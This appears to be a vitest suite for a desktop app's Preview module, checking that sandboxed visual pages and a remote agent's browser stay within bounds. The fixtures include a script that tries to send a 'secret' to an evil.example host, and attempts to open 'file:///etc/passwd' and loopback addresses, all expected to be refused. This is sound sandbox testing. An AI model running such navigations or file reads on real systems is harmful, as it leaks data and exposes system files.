/**
 * The Preview's pages, proven against the real shell (PROTOCOL.md §15.3 step 1): the cases of the deleted host,
 * visual-store and Preview-check suites whose subject is now the shell's `preview` module, asked
 * through Node's typed client (`registerPreview`) exactly as main asks it. The caller is a paired viewer's virtual
 * window (its pages are offscreen and need no app window); what only an app window has (its views, its renderer's
 * navigation, the save dialog) is proven by `preview-client.test.ts` over a fake host and by `e2e/preview*.e2e.ts`.
 */
import { EventEmitter } from "node:events";
import { mkdtemp, rm } from "node:fs/promises";
import { createServer, type Server } from "node:http";
import os from "node:os";
import path from "node:path";
import { afterAll, afterEach, beforeAll, describe, expect, it } from "vitest";
import {
	EMPTY_PREVIEW,
	PREVIEW_COMMAND,
	PREVIEW_STATE,
	PREVIEW_STREAM_INPUT,
	PREVIEW_STREAM_PDF,
	PREVIEW_STREAM_POLL,
	PREVIEW_VISUAL,
	type PreviewRequest,
	type PreviewState,
	type PreviewStreamInput,
	type PreviewStreamPoll,
	type PreviewVisualEvent,
} from "../../../shared/preview";
import type { ClientWindow } from "../../web/client-window";
import { type IpcCaller, IpcRegistry } from "../../web/ipc-registry";
import { shellModule } from "./client";
import { type PreviewClient, type PreviewSpec, type RelaySocket, registerPreview, type VisualizeTab } from "./preview";
import { startTestShell, type TestShell, testShellExecutable } from "./test-shell";

const executable = testShellExecutable();

const SURFACE = { x: 0, y: 0, width: 390, height: 700 };
/** The button every fixture page puts at the same place: its centre, as fractions of the 390×700 surface. */
const TAP = { t: "tap", x: 100 / 390, y: 58 / 700 } as const;
const BOX = "position:fixed;left:20px;top:30px;width:160px;height:56px;display:block";
const TOKEN = "x".repeat(32);

/** A paired viewer's virtual window: what main hands the registry as `caller.win`. */
class Viewer extends EventEmitter {
	readonly states: PreviewState[] = [];
	readonly visuals: PreviewVisualEvent[] = [];
	readonly webContents: { id: number; send(channel: string, payload: unknown): void };
	onVisual: (event: PreviewVisualEvent) => void = () => {};
	constructor(id: number) {
		super();
		this.webContents = {
			id,
			send: (channel, payload) => {
				if (channel === PREVIEW_STATE) this.states.push(payload as PreviewState);
				if (channel === PREVIEW_VISUAL) {
					this.visuals.push(payload as PreviewVisualEvent);
					this.onVisual(payload as PreviewVisualEvent);
				}
			},
		};
	}
	isDestroyed() {
		return false;
	}
	get last(): PreviewState | undefined {
		return this.states.at(-1);
	}
}

/** A tunnel to a paired host's relay: frames by hand, open from the start. */
class FakeRelaySocket implements RelaySocket {
	readonly ready = Promise.resolve();
	readonly sent: string[] = [];
	isOpen = true;
	closed = false;
	readonly #messages: Array<(data: string) => void> = [];
	readonly #closes: Array<() => void> = [];
	send(data: string) {
		this.sent.push(data);
	}
	close() {
		if (this.closed) return;
		this.closed = true;
		this.isOpen = false;
		for (const listener of this.#closes) listener();
	}
	onMessage(listener: (data: string) => void) {
		this.#messages.push(listener);
	}
	onClose(listener: () => void) {
		this.#closes.push(listener);
	}
	push(data: object) {
		for (const listener of this.#messages) listener(JSON.stringify(data));
	}
	frames(): Array<Record<string, unknown>> {
		return this.sent.map(frame => JSON.parse(frame) as Record<string, unknown>);
	}
}

/** The tab's omp, as far as the Preview check asks of it. */
interface JudgeRig {
	available: boolean;
	verdict: { judged: boolean; problem: "error" | "blank" | null };
	commands: Array<{ type: string; image?: { data: string; mimeType: string } }>;
}

/**
 * These suites drive real pages in a real shell: what they wait for is another process's doing (a load, a frame, a
 * notice), so they poll for it (`until`) instead of advancing a fake clock, which would not move the shell's.
 */
function pause(ms: number): Promise<void> {
	const { promise, resolve } = Promise.withResolvers<void>();
	setTimeout(resolve, ms);
	return promise;
}

async function until<T>(
	what: string,
	probe: () => T | undefined | false | Promise<T | undefined | false>,
	ms = 20_000,
): Promise<T> {
	const deadline = Date.now() + ms;
	for (;;) {
		const value = await probe();
		if (value) return value;
		if (Date.now() > deadline) throw new Error(`timed out waiting for ${what}`);
		await pause(50);
	}
}

describe.skipIf(!executable)("the Preview module over the real shell", () => {
	let shell: TestShell;
	let ipc: IpcRegistry;
	let client: PreviewClient;
	let server: Server;
	let origin: string;
	let project: string;
	const prefs = { judge: false, active: null as string | null };
	const tunnel: { socket: RelaySocket | null } = { socket: null };
	const remoteTabs = new Set<string>();
	const viewers: Viewer[] = [];
	const requests: string[] = [];
	let nextViewer = 0;

	const PAGES: Record<string, string> = {
		"/": "<!doctype html><title>Fixture</title><p>hello</p>",
		"/popup": `<!doctype html><title>Popup source</title><a id=go target=_blank href="/second" style="${BOX}">go</a>`,
		"/second": "<!doctype html><title>Second page</title><p>second</p>",
		"/keyboard": `<!doctype html><title>Keyboard</title><input style="${BOX}" value="seed">
<script>
const field = document.querySelector('input');
field.onfocus = () => document.title = 'focused';
field.oninput = () => document.title = 'value:' + field.value;
field.onkeydown = e => {
  if (e.key === 'ArrowLeft') document.title = [e.key, e.code, e.isTrusted].join(':');
};
</script>`,
	};

	beforeAll(async () => {
		shell = await startTestShell(executable as string);
		project = await mkdtemp(path.join(os.tmpdir(), "preview-parity-"));
		server = createServer((request, response) => {
			const body = PAGES[request.url ?? "/"];
			requests.push(request.url ?? "/");
			response.writeHead(body ? 200 : 404, { "content-type": "text/html" });
			response.end(body ?? "");
		});
		const listening = Promise.withResolvers<void>();
		server.listen(0, "127.0.0.1", () => listening.resolve());
		await listening.promise;
		const address = server.address();
		origin = `http://127.0.0.1:${typeof address === "object" && address ? address.port : 0}`;
		ipc = new IpcRegistry({ handle: () => {}, on: () => {} });
		client = registerPreview(
			ipc,
			{
				// Tabs named in `remoteTabs` run on a paired host; the tunnel is what `remoteDevices.previewRelay` would give.
				tabTarget: (_win, tabId) => (tabId && remoteTabs.has(tabId) ? { device: "host" } : tabId ? {} : null),
				tunnel: () => tunnel.socket,
				judgeAssist: () => prefs.judge,
				activeTab: () => prefs.active,
			},
			shellModule<PreviewSpec>("preview", () => shell.client),
		);
	}, 120_000);

	afterEach(async () => {
		// The store keeps at most 8 visuals per tab, and every case opens in the same tab: each closes what it opened.
		const closer = viewers[0];
		for (const [id, tabId] of openedVisuals) {
			if (closer) await client.visualize({ ...tab(closer), tabId }, { action: "close", visual: id }).catch(() => {});
		}
		openedVisuals.clear();
		for (const viewer of viewers.splice(0)) await ask(viewer, { action: "dispose" }).catch(() => {});
		prefs.judge = false;
		prefs.active = null;
		tunnel.socket = null;
		remoteTabs.clear();
	});

	afterAll(async () => {
		await shell?.close();
		if (server) {
			const closed = Promise.withResolvers<void>();
			server.close(() => closed.resolve());
			await closed.promise;
		}
		if (project) await rm(project, { recursive: true, force: true });
	}, 60_000);

	const viewer = () => {
		const made = new Viewer(-++nextViewer);
		viewers.push(made);
		return made;
	};
	const caller = (win: Viewer): IpcCaller => ({
		win: win as unknown as ClientWindow,
		browserWindow: null,
		sender: { id: win.webContents.id, once: () => {} },
	});
	const ask = (win: Viewer, request: PreviewRequest) =>
		ipc.invoke(PREVIEW_COMMAND, caller(win), [request]) as Promise<PreviewState>;
	const poll = (win: Viewer, ack: number | null, wait = 5000) =>
		ipc.invoke(PREVIEW_STREAM_POLL, caller(win), [{ ack, wait }]) as Promise<PreviewStreamPoll>;
	const input = (win: Viewer, ...events: PreviewStreamInput[]) =>
		ipc.send(PREVIEW_STREAM_INPUT, caller(win), [events]);
	const lay = (win: Viewer) => ask(win, { action: "layout", bounds: SURFACE, visible: true, dpr: 1 });
	const loaded = async (win: Viewer, url: string) => {
		await ask(win, { action: "load", url });
		await until(`${url} to load`, () => win.last?.url === url && win.last.loading === false);
	};
	/** A tap sent before a fresh page can hit-test is lost, as on any browser: tap again until `done`. */
	const tapUntil = async (win: Viewer, done: () => boolean) => {
		let last = 0;
		await until("the tap to land", () => {
			if (Date.now() - last > 1200) {
				input(win, TAP);
				last = Date.now();
			}
			return done();
		});
	};
	const visual = (text: string) => /visual ([0-9a-f]{16})/.exec(text)?.[1] ?? "";
	const tab = (win: Viewer, rpc: unknown = null) => ({
		tabId: "tab",
		cwd: project,
		win: win as unknown as ClientWindow,
		rpc: rpc as never,
	});
	/** Visual ids the cases opened, with their tab. */
	const openedVisuals = new Map<string, string>();
	/** `gui_visualize` as the tab runs it, remembering what it opened for `afterEach` to close. */
	const visualize = async (on: VisualizeTab, args: object) => {
		const result = await client.visualize(on, args);
		const id = visual(result.text);
		if (!result.isError && id) openedVisuals.set(id, on.tabId);
		return result;
	};
	/** Shows a visual the agent just opened, as the renderer does when it hears of it. */
	const show = async (win: Viewer, id: string) => {
		await ask(win, { action: "showVisual", tabId: "tab", visualId: id });
		await until(
			"the visual's page",
			() => win.last?.session === "visual" && win.last.url.startsWith("omp-visual://"),
		);
	};
	/** Opens an inline visual and shows it on a laid-out surface; its first frame is out, so a tap can land. */
	const openVisual = async (win: Viewer, html: string) => {
		await lay(win);
		const opened = await visualize(tab(win), { action: "open", html });
		expect(opened.isError).toBe(false);
		const id = visual(opened.text);
		expect(id).toMatch(/^[0-9a-f]{16}$/);
		await show(win, id);
		await until("the visual to load", () => win.last?.loading === false);
		const first = await poll(win, null);
		expect(first.frame).not.toBeNull();
		return id;
	};

	it("types committed Unicode and edits it through trusted platform keys", async () => {
		const win = viewer();
		await lay(win);
		await loaded(win, `${origin}/keyboard`);
		await tapUntil(win, () => win.last?.title === "focused");
		input(
			win,
			{ t: "key", key: "a", mods: [process.platform === "darwin" ? "meta" : "control"] },
			{ t: "text", text: "a한글😀" },
		);
		await until("the committed text", () => win.last?.title === "value:a한글😀");
		input(win, { t: "key", key: "Backspace" });
		await until("Backspace to edit the field", () => win.last?.title === "value:a한글");
		input(win, { t: "key", key: "ArrowLeft" });
		await until("the trusted arrow key", () => win.last?.title?.startsWith("ArrowLeft:"));
		if (process.platform === "darwin") expect(win.last?.title).toBe("ArrowLeft:ArrowLeft:true");
		else expect(win.last?.title).toMatch(/^ArrowLeft:.*:true$/);
	}, 60_000);

	it("prints the phone page as a PDF and refuses bytes over the link's budget", async () => {
		const win = viewer();
		await lay(win);
		await loaded(win, `${origin}/`);
		const printed = (await ipc.invoke(PREVIEW_STREAM_PDF, caller(win), [])) as {
			name: string;
			base64: string;
		};
		expect(printed.name).toBe("Fixture.pdf");
		expect(Buffer.from(printed.base64, "base64").subarray(0, 5).toString()).toBe("%PDF-");
		const module = shellModule<PreviewSpec>("preview", () => shell.client);
		await expect(module.request("pdf", { owner: { key: win.webContents.id }, maxBytes: 1 })).rejects.toThrow(
			"too large to send over this link",
		);
	}, 60_000);

	it("does not send a visual's image request to a network endpoint", async () => {
		const win = viewer();
		const sink = `/visual-egress-${win.webContents.id}`;
		await openVisual(
			win,
			`<!doctype html><title>Waiting</title><img src="${origin}${sink}" onerror="document.title='blocked'">`,
		);
		await until("the image to be refused", () => win.last?.title === "blocked");
		expect(requests).not.toContain(sink);
	}, 60_000);

	it("keeps one set of pages per owner until it is disposed, and shows the empty preview after", async () => {
		const win = viewer();
		expect((await lay(win)).tabs).toHaveLength(1);
		expect((await ask(win, { action: "newTab" })).tabs).toHaveLength(2);
		expect(await ask(win, { action: "dispose" })).toEqual(EMPTY_PREVIEW);
		expect((await ask(win, { action: "clearProblems" })).tabs).toHaveLength(1);
	}, 60_000);

	it("closes a viewer's pages when its virtual window closes", async () => {
		const win = viewer();
		await ask(win, { action: "newTab" });
		const before = await ask(win, { action: "clearProblems" });
		expect(before.tabs).toHaveLength(2);
		win.emit("closed");
		const after = await ask(win, { action: "clearProblems" });
		expect(after.tabs).toHaveLength(1);
		expect(after.tabs[0]?.id).not.toBe(before.tabs[0]?.id);
	}, 60_000);

	it("loads a web page, reports its title and address, and hands out a frame of it", async () => {
		const win = viewer();
		await lay(win);
		await loaded(win, `${origin}/`);
		expect(win.last).toMatchObject({ title: "Fixture", session: "web", error: null });
		const first = await poll(win, null);
		expect(first.frame?.tab).toBe(win.last?.activeTab);
		expect(first.frame?.jpeg.length).toBeGreaterThan(0);
	}, 60_000);

	it("keeps a web page on web addresses: no visual, no file, no refusal that leaves the tab changed", async () => {
		const win = viewer();
		await lay(win);
		await loaded(win, `${origin}/`);
		await expect(ask(win, { action: "load", url: "omp-visual://v1-0123456789abcdef/index.html" })).rejects.toThrow(
			"Preview URL unavailable",
		);
		await expect(ask(win, { action: "load", url: "file:///etc/passwd" })).rejects.toThrow("Preview URL unavailable");
		expect(win.last?.url).toBe(`${origin}/`);
	}, 60_000);

	it("opens a web page's popup as a web tab and shows it", async () => {
		const win = viewer();
		await lay(win);
		await loaded(win, `${origin}/popup`);
		expect((await poll(win, null)).frame).not.toBeNull();
		await tapUntil(win, () => win.last?.tabs.length === 2);
		await until("the popup's address", () => win.last?.url === `${origin}/second`);
		expect(win.last?.session).toBe("web");
		expect(win.last?.tabs.map(entry => entry.url)).toEqual([`${origin}/popup`, `${origin}/second`]);
	}, 90_000);

	it("shows a visual in a page of the visual session, replacing the empty web tab, and opens an address typed there beside it", async () => {
		const win = viewer();
		await lay(win);
		const opened = await visualize(tab(win), {
			action: "open",
			html: "<!doctype html><title>V</title><p>drawn</p>",
		});
		expect(opened).toMatchObject({ isError: false });
		expect(opened.text).toContain("version 1");
		await show(win, visual(opened.text));
		expect(win.last?.tabs).toHaveLength(1);
		expect(win.last?.visual?.id).toBe(visual(opened.text));
		expect(win.last?.url).toMatch(/^omp-visual:\/\/v1-[0-9a-f]{16}\/index\.html$/);

		// An address the user types on a visual's tab opens a web tab beside it.
		const state = await ask(win, { action: "load", url: `${origin}/` });
		expect(state.session).toBe("web");
		expect(state.tabs).toHaveLength(2);
		expect(win.last?.tabs[0]?.visual).toBe(visual(opened.text));
	}, 90_000);

	it("keeps a visual's page inside its own visual, whatever the page starts, and offers a link only after the person's own click", async () => {
		const win = viewer();
		const href = "https://docs.example/guide?q=a%20b#part";
		await openVisual(
			win,
			`<!doctype html><title>Links</title><a id=link href="${href}" style="${BOX}">docs</a>` +
				// A script's own navigation, with no real input, is refused without a word.
				'<script>setTimeout(() => { location.href = "https://evil.example/?d=secret"; window.open("https://evil.example/popup"); }, 400)</script>',
		);
		// A refusal is the absence of an effect: give the script's 400 ms navigation time to have happened.
		await pause(1500);
		expect(win.last?.notice).toBeNull();
		expect(win.last?.url.startsWith("omp-visual://")).toBe(true);
		expect(win.last?.tabs).toHaveLength(1);

		// After a real click on the page the person sees the whole address and decides.
		await tapUntil(win, () => win.last?.notice?.kind === "link");
		expect(win.last?.notice).toEqual({ kind: "link", url: href });
		expect(win.last?.url.startsWith("omp-visual://")).toBe(true);
		expect(win.last?.tabs).toHaveLength(1);
		await ask(win, { action: "dismissNotice" });
		expect(win.last?.notice).toBeNull();
	}, 90_000);

	it("never lets the agent's browser onto a visual's page", async () => {
		const win = viewer();
		await openVisual(win, "<!doctype html><title>V</title><p>drawn</p>");
		tunnel.socket = new FakeRelaySocket();
		remoteTabs.add("tab");
		await expect(
			ask(win, { action: "agentStart", tabId: "tab", url: "http://127.0.0.1:9333", token: TOKEN }),
		).rejects.toThrow("Agent browsing is for web pages, not visuals");
		expect((tunnel.socket as FakeRelaySocket).closed).toBe(true);
	}, 90_000);

	describe("agent browsing on a paired host's tab", () => {
		const RELAY = { action: "agentStart", tabId: "tab", url: "http://127.0.0.1:9333", token: TOKEN } as const;

		/** A page loaded while the tab was this computer's, then the tab is the host's: its loopback addresses stay blocked. */
		async function driven(win: Viewer) {
			await lay(win);
			await loaded(win, `${origin}/`);
			remoteTabs.add("tab");
			const socket = new FakeRelaySocket();
			tunnel.socket = socket;
			const started = await ask(win, RELAY);
			expect(started.agent).toMatchObject({ tabId: "tab" });
			const [hello] = await until("the extension's hello", () => {
				const frames = socket.frames();
				return frames.length > 0 && frames;
			});
			const tabs = hello?.tabs as Array<{ tabId: number }> | undefined;
			return { socket, hello, tabId: tabs?.[0]?.tabId };
		}
		/** One relay command, its answer by id. */
		const rpc = async (socket: FakeRelaySocket, id: number, body: object) => {
			socket.push({ t: "rpc", id, ...body });
			return until(`answer ${id}`, () => socket.frames().find(frame => frame.id === id));
		};

		it("runs the relay's extension on this computer's page over the tunnel, which says hello with that page", async () => {
			const win = viewer();
			const { socket, hello, tabId } = await driven(win);
			expect(hello).toMatchObject({ t: "hello", tabs: [{ url: `${origin}/`, active: true }] });
			expect(await rpc(socket, 1, { op: "attach", tabId })).toEqual({ t: "rpcResult", id: 1, ok: true, result: {} });
			expect(
				await rpc(socket, 2, {
					op: "send",
					tabId,
					method: "Runtime.evaluate",
					params: { expression: "1 + 1", returnByValue: true },
				}),
			).toMatchObject({
				id: 2,
				ok: true,
				result: { result: { value: 2 } },
			});
			await until("the banner to show the attached agent", () => win.last?.agent?.attached === true);
		}, 90_000);

		it("never lets the host's agent open this computer's own addresses", async () => {
			const win = viewer();
			const { socket, tabId } = await driven(win);
			await rpc(socket, 1, { op: "attach", tabId });
			let id = 1;
			for (const url of ["http://localhost:3000/", "http://127.0.0.1:47831/", "file:///etc/passwd"]) {
				id += 1;
				expect(
					await rpc(socket, id, { op: "send", tabId, method: "Page.navigate", params: { url } }),
					url,
				).toMatchObject({
					ok: false,
				});
			}
		}, 90_000);

		it("takes the page back: Take over closes the tunnel and drops the banner; the relay closing does too", async () => {
			const first = viewer();
			const { socket } = await driven(first);
			expect((await ask(first, { action: "agentStop" })).agent).toBeNull();
			await until("the tunnel to close", () => socket.closed);

			// The host's relay going away (its tab's omp stopped, the link dropped) ends it the same way.
			const second = viewer();
			const again = await driven(second);
			again.socket.close();
			await until("the banner to drop", () => second.last?.agent === null);
		}, 120_000);

		it("says why when the tab has no tunnel, without leaving a banner", async () => {
			const win = viewer();
			await lay(win);
			await loaded(win, `${origin}/`);
			remoteTabs.add("tab");
			tunnel.socket = null;
			await expect(ask(win, RELAY)).rejects.toThrow("not available for this tab");
			expect((await ask(win, { action: "clearProblems" })).agent).toBeNull();
		}, 60_000);
	});

	describe("Preview check", () => {
		const judged = (kind: "error" | "blank" | null): JudgeRig => ({
			available: true,
			verdict: { judged: kind !== null, problem: kind },
			commands: [],
		});
		const omp = (rig: JudgeRig) => ({
			command: async (command: { type: string; image?: { data: string; mimeType: string } }) => {
				rig.commands.push(command);
				if (command.type === "judge_available") return { success: true, data: { available: rig.available } };
				return { success: true, data: rig.verdict };
			},
		});
		/** The agent opens a visual on a laid-out surface; the window shows it when told (the tab is in front). */
		async function open(
			win: Viewer,
			rig: JudgeRig,
			args: object,
			{ shown, bounds = SURFACE }: { shown: boolean; bounds?: typeof SURFACE },
		) {
			prefs.judge = true;
			prefs.active = "tab";
			await ask(win, { action: "layout", bounds, visible: true, dpr: 1 });
			if (shown)
				win.onVisual = event => {
					void ask(win, { action: "showVisual", tabId: event.tabId, visualId: event.visualId });
				};
			return visualize(tab(win, omp(rig)), args);
		}
		const PAGE = { action: "open", html: "<!doctype html><title>Checked</title><p>content</p>" } as const;
		const asked = (rig: JudgeRig) => rig.commands.map(command => command.type);

		it("tells the agent the page shows an error, hands the judge the page's own PNG, and flags that page", async () => {
			const win = viewer();
			const rig = judged("error");
			const result = await open(win, rig, PAGE, {
				shown: true,
				bounds: { ...SURFACE, width: 1400, height: 1600 },
			});
			expect(result.isError).toBe(false);
			expect(result.text).toContain("Preview check: the page shows an error message.");
			const picture = rig.commands.find(command => command.type === "judge_preview_check")?.image;
			expect(picture?.mimeType).toBe("image/png");
			const png = Buffer.from(picture?.data ?? "", "base64");
			expect(png.subarray(0, 4).toString("latin1")).toBe("\x89PNG");
			expect(png.readUInt32BE(16)).toBeLessThanOrEqual(1280);
			expect(png.readUInt32BE(20)).toBeLessThanOrEqual(1280);
			await until("the notice", () => win.last?.notice?.kind === "check");
			expect(win.last?.notice).toEqual({ kind: "check", problem: "error" });
		}, 90_000);

		it("tells the agent the page looks blank, and flags it", async () => {
			const win = viewer();
			const result = await open(win, judged("blank"), PAGE, { shown: true });
			expect(result.text).toContain("Preview check: the page looks blank");
			await until("the notice", () => win.last?.notice?.kind === "check");
			expect(win.last?.notice).toEqual({ kind: "check", problem: "blank" });
		}, 90_000);

		it("answers exactly as before, with no notice, when the judge sees nothing wrong", async () => {
			const win = viewer();
			const rig = judged(null);
			const result = await open(win, rig, PAGE, { shown: true });
			expect(result.text).not.toContain("Preview check");
			expect(asked(rig)).toContain("judge_preview_check");
			expect(win.last?.notice ?? null).toBeNull();
		}, 90_000);

		it("captures nothing and asks nothing while the judgeAssist switch is off", async () => {
			const win = viewer();
			const rig = judged("error");
			prefs.judge = false;
			await lay(win);
			win.onVisual = event => {
				void ask(win, { action: "showVisual", tabId: event.tabId, visualId: event.visualId });
			};
			const result = await visualize(tab(win, omp(rig)), PAGE);
			expect(result.text).not.toContain("Preview check");
			expect(rig.commands).toEqual([]);
		}, 90_000);

		it("ends the check at once, with no capture, when the tab's omp has no native judge", async () => {
			const win = viewer();
			const rig: JudgeRig = { ...judged("error"), available: false };
			const started = Date.now();
			const result = await open(win, rig, PAGE, { shown: true });
			expect(result.text).not.toContain("Preview check");
			expect(asked(rig)).toEqual(["judge_available"]);
			expect(Date.now() - started).toBeLessThan(3000);
		}, 90_000);

		it("gives up on a page of a tab behind, which no window shows, without a verdict or a notice", async () => {
			const win = viewer();
			const rig = judged("error");
			prefs.judge = true;
			prefs.active = "other";
			const result = await visualize(tab(win, omp(rig)), PAGE);
			expect(result.text).not.toContain("Preview check");
			expect(asked(rig)).toEqual(["judge_available"]);
		}, 90_000);

		it("never captures a web visual's page, which may show a site the person moved to", async () => {
			const win = viewer();
			const rig = judged("error");
			const result = await open(win, rig, { action: "open", target: `${origin}/` }, { shown: true });
			expect(result.isError).toBe(false);
			expect(result.text).not.toContain("Preview check");
			expect(asked(rig)).not.toContain("judge_preview_check");
		}, 90_000);
	});

	describe("gui_visualize", () => {
		it("checks the shown page's title and address, waits for nobody when nothing shows it, and closes only this tab's visuals", async () => {
			const win = viewer();
			const id = await openVisual(win, "<!doctype html><title>One</title><p data-choice=a>a</p>");
			const checked = await client.visualize(tab(win), { action: "check", visual: id });
			expect(checked.text).toContain("Title: One");
			expect(checked.text).toContain("No console errors or warnings.");
			const other = await client.visualize({ ...tab(win), tabId: "other" }, { action: "check", visual: id });
			expect(other).toEqual({ text: `No visual ${id} in this tab`, isError: true });
			expect(await client.visualize(tab(win), { action: "close", visual: id })).toEqual({
				text: `Closed visual ${id}.`,
				isError: false,
			});
			await until("the page to close", async () =>
				(await ask(win, { action: "clearProblems" })).tabs.every(entry => entry.visual !== id),
			);
			expect((await client.visualize(tab(win), { action: "nope" })).isError).toBe(true);
		}, 90_000);

		it("says why a choice could not be made", async () => {
			const win = viewer();
			const opened = await visualize(tab(win), { action: "open", html: "<p data-choice=a>a</p>" });
			const id = visual(opened.text);
			const none = await client.visualize(tab(win), { action: "choose", visual: id, timeout_seconds: 10 });
			expect(none).toMatchObject({ isError: true });
		}, 60_000);
	});
});
